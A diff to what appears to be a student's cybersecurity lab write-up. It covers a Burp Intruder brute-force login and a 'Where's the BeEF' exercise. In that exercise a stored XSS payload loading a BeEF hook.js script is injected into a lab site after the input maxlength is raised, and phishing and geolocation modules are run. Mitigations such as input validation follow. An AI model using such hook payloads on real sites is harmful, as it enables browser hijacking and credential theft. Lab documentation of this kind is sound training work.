@@ -116,3 +116,37 @@ Went to the `payloads` tab, `payload` type set as `simple list`. Added the login
 Started the attack. After analysis of intruder attack results, the login username/password combination of `Tonystark` and `IamironMan` did result in a successful login. I recommended mitigations including requiring complex usernames and passwords, using multi-factored authentication, and enable a lockout after a certain amount of failed login attempts. 
 
 <h3>"Where's the BeEF"</h3>
+
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+
+To prepare Replicants website, I navigated to Vagrant, ran command: `~/Documents/web-vulns$ docker-compose up`. Went to `http://192.168.13.25/vulnerabilities/xss_s/` Reset and logged back in. To setup BeEF, on Vagrant open the command line and entered: `sudo beef`. To access the BeEF GUI, right-click the first URL `UI_URL: http://127.0.0.1:3000/ui/panel` and select open link. Logged in with the following credentials: Username: `beef` password: `feeb`.
+
+```
+BeEF hook: http://127.0.0.1:3000/hook.js
+Playload: <script src="http://127.0.0.1:3000/hook.js"></script>
+'''
+I injected this payload and an issue that was found was there is only a max length= "50" in orginal source code, therefore we can not input the whole payload code, so by right-clicking on the web page and selecting "inspecting the element". Chaged the maxlength="100".
+
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+
+Since I hooked into the Replicants website, I attempted a couple of BeEF exploits from `social engineering >> pretty theft`, `social engineering>> fake notification bar`, `host>> get geolocation(third party)`. I recomment input validation. It is a common method used to mitigate cross-site scripting. 
+
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+<p>
+<img src="https://github.com/kleeloy/osticket-prereqs/blob/main/Diagrams/configuring%20the%20osticket%20php%20manager%20(lab%203).png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
+</p>
+
+
+
